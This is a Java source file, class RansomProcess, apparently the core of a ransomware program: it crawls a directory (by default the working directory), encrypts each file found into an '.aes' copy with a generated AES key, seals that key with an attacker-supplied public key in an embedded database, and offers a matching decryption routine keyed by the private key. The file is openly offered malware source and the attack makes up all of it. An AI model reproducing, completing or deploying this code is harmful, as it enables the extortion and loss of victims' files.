package com.security;

import com.fasterxml.jackson.databind.ObjectMapper;

import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.security.GeneralSecurityException;
import java.security.NoSuchAlgorithmException;
import java.sql.SQLException;
import java.util.*;


public class RansomProcess {


    private String PathtoFind;

    public RansomProcess() {
        this.PathtoFind = getDefaultPath();
    }

    public RansomProcess(String PathtoFind) {
        this.PathtoFind = PathtoFind;
    }


    public void StartEncryptProcess(String pubkey) {
        final TreeMap<String, HashMap<String, String>> containsFilters = new SearchDirectory(this.PathtoFind).GetFileMap();
        final Set set = containsFilters.entrySet();
        final Iterator iterator = set.iterator();
        SecretKeySpec aesKey = null;

        try {
            aesKey = CryptoRansomware.GenKey();
            while (iterator.hasNext()) {
                final Map.Entry mentry = (Map.Entry) iterator.next();

                //   System.out.print("key is: " + mentry.getKey() + " & Value is: " + mentry.getValue());

                final Object obj = mentry.getValue();
                final ObjectMapper oMapper = new ObjectMapper();
                final HashMap<String, String> Map = oMapper.convertValue(obj, HashMap.class);


                final Set mapset = Map.entrySet();
                final Iterator mapiterator = mapset.iterator();

                while (mapiterator.hasNext()) {

                    Map.Entry entry = (Map.Entry) mapiterator.next();
                    final File filein = new File(entry.getKey() + "." + entry.getValue());
                    final File fileout = new File(entry.getKey() + ".aes");

                    CryptoRansomware.EncryptFile(filein, fileout, aesKey);
                }

            }
            EmbeddedDatabase.InsertRecordIntoTable(containsFilters, CryptoRansomware.RetrieveEncryptedAesKey(pubkey, aesKey));
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (RansomwareException e) {
            System.out.println("Already Encrypted Try Decrypt");
        } catch (SQLException e) {
            System.out.println("SqlException Caught");
        } catch (GeneralSecurityException e) {
            System.out.println("Cipher Error");
        }

    }

    public void StartDecryptProcess(String privKey) {
        try {
            final TreeMap<String, HashMap<String, String>> containsFilters = EmbeddedDatabase.GetMapFromTable();
            final Set set = containsFilters.entrySet();
            final Iterator iterator = set.iterator();


            final SecretKeySpec aesKey = CryptoRansomware.RetrieveAesKey(privKey);
            while (iterator.hasNext()) {
                final Map.Entry mentry = (Map.Entry) iterator.next();

                //   System.out.print("key is: " + mentry.getKey() + " & Value is: " + mentry.getValue());

                final Object obj = mentry.getValue();
                final ObjectMapper oMapper = new ObjectMapper();
                final HashMap<String, String> Map = oMapper.convertValue(obj, HashMap.class);


                final Set mapset = Map.entrySet();
                final Iterator mapiterator = mapset.iterator();

                while (mapiterator.hasNext()) {

                    Map.Entry entry = (Map.Entry) mapiterator.next();
                    final File filein = new File(entry.getKey() + "." + entry.getValue());
                    final File fileout = new File(entry.getKey() + ".aes");


                    CryptoRansomware.DecryptFile(fileout, filein, aesKey);
                }

            }

        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (SQLException e) {
            e.printStackTrace();
        } catch (GeneralSecurityException e) {
            e.printStackTrace();
        } catch (NullPointerException e) {
            System.out.println("Map not Exists Encrypt First");
        } finally {
            EmbeddedDatabase.DropTable();
        }

    }

    private String getDefaultPath() {
        String path = System.getProperty("user.dir");
        return path;
    }

    public void ProcessClose() {
        EmbeddedDatabase.shutdown();
    }


}
